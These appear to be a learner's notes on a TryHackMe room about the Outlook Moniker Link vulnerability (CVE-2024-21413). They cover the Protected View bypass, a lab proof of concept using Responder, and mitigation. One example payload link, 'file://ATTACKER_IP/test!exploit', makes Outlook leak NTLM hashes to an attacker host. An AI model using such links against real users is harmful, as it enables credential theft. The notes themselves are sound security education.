
### **TryHackMe: Cyber Security 101**

**Room:** `Moniker Link (CVE-2024-21413)`  
**Status:** Completed  
**Date:** 2025-08-05

----------

### **Goal**

Understand the Microsoft Outlook Moniker Link vulnerability (CVE-2024-21413), which allows remote attackers to bypass Outlook’s Protected View, enabling NTLM credential leakage and remote code execution through specially crafted Moniker Links.

---------

### **Key Topics Covered**
**1. Overview of the Moniker Link Vulnerability**

-   Microsoft Outlook was found vulnerable to a Remote Code Execution (RCE) and credential leak attack via Moniker Links.
    
-   The vulnerability was publicly disclosed on February 13, 2024, credited to Haifei Li of Check Point Research.
    
-   Attackers can send an email containing a malicious Moniker Link that causes Outlook to leak the user’s NTLM credentials when clicked.
    
-   This exploits Outlook’s ability to render HTML emails and parse various hyperlink schemes including Moniker Links, which open external applications via the Component Object Model (COM) on Windows.
    

----------

**2. Outlook’s Protected View and Bypass**

-   Outlook’s Protected View is designed to block potentially harmful content by opening attachments and links in a read-only mode, disabling macros and other threats.
    
-   Normally, file:// Moniker Links triggering SMB authentication are blocked by Protected View, preventing automatic credential transmission.
    
-   The vulnerability arises by modifying the file:// Moniker Link with a special character `!` and appended text (e.g., `file://ATTACKER_IP/test!exploit`), which bypasses Protected View’s security mechanisms.
    
-   This bypass forces Outlook to initiate an SMB authentication attempt using the victim’s Windows credentials, leaking the netNTLMv2 hash to the attacker.
    
-   The attack does not require the remote share to exist; the authentication attempt itself leaks credential hashes.
    

----------

**3. Practical Demonstration and Proof of Concept (PoC)**

-   The room walks through a hands-on example using a Python script that sends a malicious email containing the crafted Moniker Link.
    
-   The PoC script:
    
    -   Uses SMTP to send an email from an attacker address to a victim address.
        
    -   Embeds the Moniker Link with the special `!` character inside the HTML body.
        
    -   Requires SMTP server login credentials (provided in the lab environment).
        
-   On the attack box, the attacker runs Responder to listen for SMB authentication attempts.
    
-   When the victim opens Outlook and clicks the malicious link, the SMB authentication request is triggered, capturing the victim’s netNTLMv2 hash.
    
-   Packet capture with Wireshark shows the SMB request with a truncated netNTLMv2 hash.
    
-   This demonstrates both credential leakage and the potential for RCE through COM exploitation.
    

----------

**4. Mitigation and Impact**

-   Microsoft has patched the vulnerability in a subsequent Tuesday security update.
    
-   There is no configuration change in Outlook to prevent this attack as it bypasses Protected View itself.
    
-   Blocking the SMB protocol entirely is impractical due to its essential role in network shares and typical Windows operations.
    
-   The vulnerability underscores the importance of cautious handling of email links and attachments.
    

----------

### **What I Learned**

-   The mechanism and risk of Moniker Link exploitation in Microsoft Outlook.
    
-   How Outlook’s Protected View functions and how it can be bypassed.
    
-   The role of SMB authentication and how netNTLMv2 hashes can be leaked remotely.
    
-   The practical steps of sending a crafted malicious email to exploit CVE-2024-21413.
    
-   How to use Responder to capture SMB authentication attempts.
    
-   The importance of timely patching and awareness of new attack vectors in email clients.
    
-   Limitations in mitigating certain client-side vulnerabilities without breaking core functionality.

